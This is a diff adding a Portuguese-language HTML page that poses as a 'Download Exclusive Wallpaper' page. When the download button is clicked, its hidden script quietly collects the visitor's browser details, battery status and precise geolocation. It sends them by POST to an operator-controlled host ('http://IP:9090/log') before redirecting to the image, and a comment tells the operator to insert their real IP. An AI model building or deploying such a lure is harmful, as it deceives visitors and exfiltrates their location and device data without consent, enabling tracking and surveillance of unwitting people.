@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Seu novo wallpaper</title>
+  <meta charset="UTF-8">
+</head>
+<body style="text-align: center; font-family: sans-serif;">
+  <h2>Baixe o Wallpaper Exclusivo</h2>
+  <img src="/imagem.png" alt="wallpaper" width="300"><br><br>
+  <button onclick="baixar()">Baixar Wallpaper</button>
+
+  <script>
+    async function coletarDados() {
+      let data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        battery: null,
+        location: null
+      };
+
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          data.battery = {
+            level: battery.level,
+            charging: battery.charging
+          };
+        } catch (e) {}
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          data.location = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude
+          };
+          enviar(data);
+        }, err => {
+          enviar(data);
+        }, {timeout: 5000});
+      } else {
+        enviar(data);
+      }
+    }
+
+    function enviar(dados) {
+      fetch("http://IP:9090/log", {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(dados)
+      });
+    }
+
+    function baixar() {
+      coletarDados();
+      setTimeout(() => {
+        // troca a URL abaixo para o seu IP real se necessário
+        window.location.href = "http://IP:8080/imagem.png";
+      }, 1000); // espera só pra não interromper a coleta
+    }
+  </script>
+</body>
+</html>
